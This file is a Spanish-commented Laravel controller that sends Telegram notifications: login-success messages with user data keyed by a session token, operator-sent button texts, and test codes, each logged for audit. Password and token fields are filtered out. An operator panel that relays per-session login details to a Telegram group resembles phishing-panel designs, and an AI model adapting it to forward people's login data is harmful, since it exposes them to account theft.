<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\Button;
use App\Models\ClientLog;
use App\Models\Company;
use App\Models\Setting;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use OpenApi\Attributes as OA;

class MessagingController extends Controller
{
    #[OA\Post(
        path: '/telegram/login-notification',
        tags: ['Mensajería'],
        summary: 'Notifica al grupo configurado un inicio de sesión de prueba exitoso',
        description: 'El mensaje incluye el usuario y los datos adicionales guardados en la solicitud. Omite campos sensibles como contraseñas y tokens.',
        requestBody: new OA\RequestBody(
            required: true,
            content: new OA\JsonContent(
                required: ['session_token'],
                properties: [
                    new OA\Property(property: 'session_token', type: 'string', format: 'uuid'),
                ]
            )
        ),
        responses: [
            new OA\Response(response: 200, description: 'Notificación enviada'),
            new OA\Response(response: 404, description: 'La solicitud no existe'),
            new OA\Response(response: 422, description: 'Bot o grupo de Telegram sin configurar'),
            new OA\Response(response: 502, description: 'Telegram rechazó o no respondió el envío'),
        ]
    )]
    public function sendLoginNotification(Request $request): JsonResponse
    {
        $data = $request->validate([
            'session_token' => ['required', 'uuid'],
        ]);
        $company = Company::query()->where('loading_token', $data['session_token'])->first();

        if (! $company) {
            return response()->json(['ok' => false, 'message' => 'La solicitud no existe.'], 404);
        }

        $botToken = Setting::get('telegram_bot_token');
        $chatId = Setting::get('telegram_chat_id');
        if (! $botToken || ! $chatId) {
            return response()->json([
                'ok' => false,
                'message' => 'El bot o el grupo de Telegram no están configurados en el panel.',
            ], 422);
        }

        $username = $company->name;
        if (! is_string($username) || trim($username) === '') {
            return response()->json([
                'ok' => false,
                'message' => 'La solicitud no tiene un usuario para notificar.',
            ], 422);
        }

        $text = $this->buildLoginNotification($company, trim($username));

        try {
            $response = Http::timeout(10)->asForm()->post(
                "https://api.telegram.org/bot{$botToken}/sendMessage",
                [
                    'chat_id' => $chatId,
                    'text' => $text,
                ]
            );
        } catch (\Throwable $e) {
            return response()->json([
                'ok' => false,
                'message' => 'No se pudo conectar con Telegram.',
            ], 502);
        }

        if (! $response->successful() || $response->json('ok') !== true) {
            return response()->json([
                'ok' => false,
                'message' => 'Telegram rechazó el envío: '.($response->json('description') ?? 'error desconocido'),
            ], 502);
        }

        return response()->json(['ok' => true, 'message' => 'Notificación de inicio enviada.']);
    }

    private function buildLoginNotification(Company $company, string $username): string
    {
        $lines = [
            '✅ Inicio de sesión exitoso',
            "Usuario: {$username}",
        ];

        $this->appendNotificationFields($company->data ?? [], '', $lines);

        return implode("\n", $lines);
    }

    private function appendNotificationFields(array $fields, string $prefix, array &$lines): void
    {
        foreach ($fields as $key => $value) {
            $key = (string) $key;
            if (
                preg_match('/password|pass|contrase|clave|secret|token|credential|credencial/i', $key)
                || strtolower($key) === 'usuario'
            ) {
                continue;
            }

            $label = $prefix === '' ? $key : "{$prefix}.{$key}";
            if (is_array($value)) {
                $this->appendNotificationFields($value, $label, $lines);

                continue;
            }
            if (! is_scalar($value)) {
                continue;
            }

            $text = trim(str_replace(["\r", "\n"], ' ', (string) $value));
            if ($text === '') {
                continue;
            }

            $displayLabel = ucfirst(str_replace(['_', '-'], ' ', $label));
            $lines[] = "{$displayLabel}: {$text}";
        }
    }

    #[OA\Post(
        path: '/companies/{company}/send',
        tags: ['Mensajería'],
        summary: 'Envía el texto de un botón al Telegram del cliente (notificación)',
        description: 'Envía, como notificación, el texto del botón al chat de Telegram del cliente, usando el bot del propio cliente. No controla ninguna pantalla.',
        parameters: [
            new OA\Parameter(name: 'company', in: 'path', required: true, schema: new OA\Schema(type: 'integer')),
        ],
        requestBody: new OA\RequestBody(
            required: true,
            content: new OA\JsonContent(
                required: ['button_id'],
                properties: [
                    new OA\Property(property: 'button_id', type: 'integer', example: 1),
                ]
            )
        ),
        responses: [
            new OA\Response(response: 200, description: 'Mensaje enviado'),
            new OA\Response(response: 403, description: 'El cliente no está asignado a este operador'),
            new OA\Response(response: 422, description: 'Cliente sin Telegram configurado o datos inválidos'),
            new OA\Response(response: 502, description: 'Telegram rechazó o no respondió el envío'),
        ]
    )]
    public function send(Request $request, Company $company): JsonResponse
    {
        $user = $request->user();

        // Un operador solo puede enviar a sus clientes; el admin a cualquiera.
        abort_unless(
            $user->role === 'admin' || $company->operator_id === $user->id,
            403,
            'No tienes este cliente asignado.'
        );

        $data = $request->validate([
            'button_id' => ['required', 'integer', 'exists:buttons,id'],
        ]);

        $button = Button::findOrFail($data['button_id']);

        return $this->sendText(
            $company,
            $button->label,
            $button->text,
            'Mensaje enviado.',
            true,
            'Mensaje enviado al chat global configurado.'
        );
    }

    #[OA\Post(
        path: '/telegram/send-test-code',
        tags: ['Mensajería'],
        summary: 'Envía un código de prueba al cliente de la solicitud actual',
        requestBody: new OA\RequestBody(
            required: true,
            content: new OA\JsonContent(
                required: ['session_token', 'code'],
                properties: [
                    new OA\Property(property: 'session_token', type: 'string', format: 'uuid'),
                    new OA\Property(property: 'code', type: 'string', example: '123456'),
                ]
            )
        ),
        responses: [
            new OA\Response(response: 200, description: 'Código enviado'),
            new OA\Response(response: 404, description: 'La solicitud no existe'),
            new OA\Response(response: 422, description: 'Cliente sin Telegram configurado o datos inválidos'),
            new OA\Response(response: 502, description: 'Telegram rechazó o no respondió el envío'),
        ]
    )]
    public function sendTestCode(Request $request): JsonResponse
    {
        $data = $request->validate([
            'session_token' => ['required', 'uuid'],
            'code' => ['required', 'string', 'max:255'],
        ]);
        $company = Company::query()->where('loading_token', $data['session_token'])->first();

        if (! $company) {
            return response()->json(['ok' => false, 'message' => 'La solicitud no existe.'], 404);
        }

        return $this->sendText(
            $company,
            'Código de prueba',
            $data['code'],
            'Código enviado por Telegram.',
            true,
            'Código enviado al grupo de Telegram configurado para pruebas.'
        );
    }

    private function sendText(
        Company $company,
        string $label,
        string $text,
        string $successMessage = 'Mensaje enviado.',
        bool $allowGlobalFallback = false,
        ?string $globalFallbackMessage = null
    ): JsonResponse {
        $botToken = Setting::get('telegram_bot_token');

        if (! $botToken) {
            $this->log($company, $label, $text, 'failed', 'Panel sin bot de Telegram configurado.');

            return response()->json([
                'ok' => false,
                'message' => 'El panel no tiene el bot de Telegram configurado (Configuración).',
            ], 422);
        }

        // Destino preferente de este cliente: su messenger_id (el id del usuario de
        // Telegram), o su propio telegram_chat_id. Si no tiene ninguno y se permite,
        // se usa el chat_id global configurado en Configuración.
        $chatId = $company->messenger_id ?: $company->telegram_chat_id;
        $usingGlobal = false;
        if (! $chatId && $allowGlobalFallback) {
            $chatId = Setting::get('telegram_chat_id');
            $usingGlobal = (bool) $chatId;
        }

        if (! $chatId) {
            $detail = $allowGlobalFallback
                ? 'Cliente sin chat propio ni chat global configurado.'
                : 'Cliente sin messenger_id ni chat_id propio.';

            $this->log($company, $label, $text, 'failed', $detail);

            return response()->json([
                'ok' => false,
                'message' => $allowGlobalFallback
                    ? 'Este cliente no tiene chat propio y no hay un chat global de Telegram configurado (Configuración).'
                    : 'Este cliente no tiene messenger_id (ni chat_id) propio; no se envía para no llegar a otro usuario.',
            ], 422);
        }

        try {
            $resp = Http::timeout(10)->asForm()->post(
                "https://api.telegram.org/bot{$botToken}/sendMessage",
                ['chat_id' => $chatId, 'text' => $text]
            );
        } catch (\Throwable $e) {
            $this->log($company, $label, $text, 'failed', 'No se pudo conectar con Telegram.');

            return response()->json([
                'ok' => false,
                'message' => 'No se pudo conectar con Telegram.',
            ], 502);
        }

        if ($resp->successful() && $resp->json('ok') === true) {
            $messageId = $resp->json('result.message_id');
            if (! is_int($messageId) || $messageId < 1) {
                $this->log($company, $label, $text, 'failed', 'Telegram no devolvió un message_id válido.');

                return response()->json([
                    'ok' => false,
                    'message' => 'Telegram aceptó el envío, pero no devolvió un message_id válido.',
                ], 502);
            }

            $this->log($company, $label, $text, 'sent', 'Entregado a Telegram.', $messageId);

            $message = $usingGlobal && $globalFallbackMessage
                ? $globalFallbackMessage
                : $successMessage;

            return response()->json(['ok' => true, 'message' => $message]);
        }

        $detail = 'Telegram rechazó: '.($resp->json('description') ?? 'error desconocido');
        $this->log($company, $label, $text, 'failed', $detail);

        return response()->json(['ok' => false, 'message' => $detail], 502);
    }

    /** Registra un paso en la auditoría del cliente. */
    private function log(
        Company $company,
        string $label,
        string $text,
        string $status,
        string $detail,
        ?int $telegramMessageId = null
    ): void {
        ClientLog::create([
            'company_id' => $company->id,
            'operator_id' => auth()->id(),
            'direction' => 'out',
            'label' => $label,
            'text' => $text,
            'status' => $status,
            'detail' => $detail,
            'telegram_message_id' => $telegramMessageId,
        ]);
    }
}
